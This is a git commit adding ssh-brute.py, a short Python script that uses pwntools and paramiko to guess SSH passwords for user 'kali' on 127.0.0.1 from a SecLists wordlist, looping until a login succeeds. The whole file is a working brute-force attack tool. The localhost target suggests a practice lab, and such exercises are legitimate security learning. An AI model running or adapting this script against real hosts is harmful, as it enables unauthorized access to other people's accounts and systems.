7b7728af6ceb55b192e93b2e0cc50d65db0f079b
wcheng729 <139577034+wcheng729@users.noreply.github.com>
2025-03-08 13:52:12 +0800

    Create ssh-brute.py

---
+++ ssh-brute.py
@@ -0,0 +1,25 @@
+from pwn import *
+import paramiko
+
+
+
+
+host="127.0.0.1"
+username="kali"
+attempts=0
+
+
+with open("/usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-100.txt", "r") as password_list:
+    for password in password_list:
+        password = password.strip("\n")
+        try:
+            print("[{}] Attempting password: '{}'!".format(attempts,password))
+            response = ssh(host=host, user=username, password=password, timeout=1)
+            if response.connect():
+                print("[>] Valid password found: '{}'!".format(password))
+                response.close()
+                break
+            response.close()
+        except paramiko.ssh_exception.AuthenticationException:
+            print({"[X] Invalid Password!"})
+            attempts+=1
